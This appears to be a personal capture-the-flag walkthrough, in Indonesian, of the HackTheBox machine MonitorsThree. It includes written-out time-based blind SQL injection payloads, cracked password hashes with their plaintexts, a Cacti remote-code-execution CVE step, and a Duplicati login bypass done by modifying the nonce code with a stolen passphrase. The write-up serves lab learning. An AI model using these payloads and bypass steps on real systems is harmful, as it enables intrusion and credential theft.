![[Pasted image 20250115091538.png]]
# 1. Nmap
## TCP
![[Pasted image 20250115091904.png]]
![[Pasted image 20250115092513.png]]
tidak ada port UDP

# 2. Port 80 - monitorsthree.htb
- Login http://monitorsthree.htb/login.php -> cek ==SQLinjection== -> **NOPE**
![[Pasted image 20250115093436.png]]
- Forgot password http://monitorsthree.htb/forgot_password.php
- Input `admin` -> bisa dikirim forgot password
![[Pasted image 20250115100130.png]]
- Input `admin'` -> error SQL maria DB , input `admin--+` error hilang
![[Pasted image 20250115100613.png]]
- Whatweb sales@monitorsthree.htb
![[Pasted image 20250115092553.png]]
- Kosong http://monitorsthree.htb/admin/db.php
- Kosong http://monitorsthree.htb/admin/footer.php , sepertinya page admin ada ?
- dirsearch biasa
- dirsearch raft medium
# 3. Subdomain - cacti.monitorsthree.htb 
![[Pasted image 20250115101959.png]]
cacti -> 302
tambahkan cacti.monitorsthree.htb ke /etc/host
![[Pasted image 20250115141920.png]]
cacti version 1.2.26
- https://github.com/Safarchand/CVE-2024-25641 butuh user password
- cek default password admin/admin => tidak bisa

# 4. Exploitation SQL injection
- database info -> MySQL 5.0.12 (Maria DB Fork)
![[Pasted image 20250115102652.png]]
- Database db name
![[Pasted image 20250115111205.png]]
eh ternya tidak boleh pake SQLmap :(
## Pake manual
- ditemukan db memiliki ==9 kolom==
![[Pasted image 20250115132027.png]]
![[Pasted image 20250115132109.png]]
cek apakah bisa blind sqli 
```
username=admin'AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
```

cek jumlah karakter DB = 16 berhasil ada delay 10 detik
```
username=admin'AND+(SELECT+SLEEP(10)+FROM+DUAL+WHERE+DATABASE()+LIKE+'________________')%23
```

cek huruf berurutan, berhasil ada delay 10 detik
```
username=admin'AND+(SELECT+SLEEP(10)+FROM+DUAL+WHERE+DATABASE()+LIKE+'m______________')%23
```

```
1 -> m
2 -> o
3 -> n
4 -> i
5 -> t
6 -> o
7 -> r
8 -> s
9 -> t
10 -> h
11 -> r
12 -> e
13 -> e
14 -> _
15 -> d
16 -> b
```
final -> ==monitorsthree_db==

cek column name length, tambah underscorenya terus, delay 10 saat underscorenya 5 biji
```
username=admin'AND%20(SELECT%20SLEEP(10)%20FROM%20DUAL%20WHERE%20(SELECT%20table_name%20FROM%20information_schema.columns%20WHERE%20table_schema%3dDATABASE()%20AND%20column_name%20LIKE%20'%25pass%25'%20LIMIT%200%2c1)%20LIKE%20'__')%23 -> biasa delay

username=admin'AND%20(SELECT%20SLEEP(10)%20FROM%20DUAL%20WHERE%20(SELECT%20table_name%20FROM%20information_schema.columns%20WHERE%20table_schema%3dDATABASE()%20AND%20column_name%20LIKE%20'%25pass%25'%20LIMIT%200%2c1)%20LIKE%20'_____')%23 -> 10 second delay

1 -> u
2 -> s
3 -> e
4 -> r
5 -> s

final result -> users 
```
![[Pasted image 20250115211940.png]]
## Pake ffuf (alternative best way)
Cek panjang db -> ==16==
![[Pasted image 20250118093103.png]]

Bruteforce nama db -> ==monitorsthree_db==
![[Pasted image 20250118093927.png]]

Bruteforce nama table -> ==users== menarik
![[Pasted image 20250118092840.png]]
Brute force nama kolom -> ada ==username== dan password
![[Pasted image 20250118102638.png]]

Brute force data pada kolom username -> ==admin==
![[Pasted image 20250118103608.png]]

Cek panjang kata password dari username admin -> 32
![[Pasted image 20250118104015.png]]

Brute force huruf per huruf password dari username admin -> `31a181c8372e3afc59dab863430610e8`
![[Pasted image 20250118132202.png]]

decode md5 string tsb  => ==greencacti2001==
![[Pasted image 20250118132758.png]]

# 5. Login admin ke dashboard cacti
berhasil login
![[Pasted image 20250118132937.png]]
ada CVE https://github.com/Safarchand/CVE-2024-25641 untuk mendapatkan RCE
![[Pasted image 20250118134134.png]]
dapat shell tapi, tidak bisa mengakses /home
![[Pasted image 20250118134627.png]]
untuk masuk /home harus melalui user marcun dan root
data netstat
![[Pasted image 20250118134853.png]]
/include/config.php
![[Pasted image 20250118214859.png]]
login mysql -> ada tables ==user auth_user==
![[Pasted image 20250119095751.png]]
Terdapat credential marcus -> $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK
![[Pasted image 20250119095915.png]]

detection hash, dan crack menggunaka hashcat
![[Pasted image 20250119103259.png]]

kita coba login ssh dengan password tsb -> tidak bisa
coba login dari dalam, dapat user.txt
# 6. Priviledge Escalation
cek sudo -l tidak bisa
![[Pasted image 20250119104734.png]]
coba port forwarding local port
```
ssh -i marcus_private.txt marcus@10.10.11.30 -L 8084:localhost:8084 -L 33307:localhost:33307 -L 8200:localhost:8200
```
port 8200 menarik, ada form login
![[Pasted image 20250119105314.png]]
menggunakan tiny server
![[Pasted image 20250119110234.png]]

menemukan artikel ini untuk bypass login pada duplicati
https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee
download db
```
scp -i marcus_private.txt marcus@10.10.11.30:/opt/duplicati/config/Duplicati-server.sqlite . 
```
buka pada tables options, terdapat credential -> ==Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho===
![[Pasted image 20250119122931.png]]
![[Pasted image 20250119123609.png]]
original
```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
```
modified, login dan intercept request untuk mengambil nonce stringnya
![[Pasted image 20250119124650.png]]
```
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('RgThWx/kDtqiKKoGdLC4PVbV9kXX5RzUM1RVnFinYvs=') + '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a')).toString(CryptoJS.enc.Base64);
```
berhasil login
![[Pasted image 20250119150157.png]]

lakukan backup root.txt
![[Pasted image 20250119154439.png]]
restore backupmya, untuk mendapatkan root flag
![[Pasted image 20250119154504.png]]==PWN!==